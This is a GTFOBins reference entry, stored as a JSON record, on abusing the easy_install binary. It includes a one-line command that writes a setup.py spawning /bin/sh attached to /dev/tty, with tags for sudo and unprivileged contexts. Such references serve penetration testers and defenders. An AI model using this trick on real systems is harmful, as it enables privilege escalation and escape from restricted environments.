{"title": "easy_install", "source": "gtfobins", "source_label": "GTFOBins", "path": "easy_install", "html": "<h1>easy_install</h1>\n<h2>Inherit</h2>\n<p>This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).\n\nKeep in mind that the TTY is lost, so `/dev/tty` can be used, for example:\n\n```\necho &#x27;import os; os.system(&quot;exec /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty&quot;)&#x27; &gt;setup.py\n```</p>\n<pre><code class=\"language-bash\">echo &#x27;...&#x27; &gt;setup.py\neasy_install .</code></pre>", "excerpt": "easy_install Inherit This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo &#x27;import os;…", "tags": ["func:inherit", "ctx:sudo", "ctx:unprivileged"]}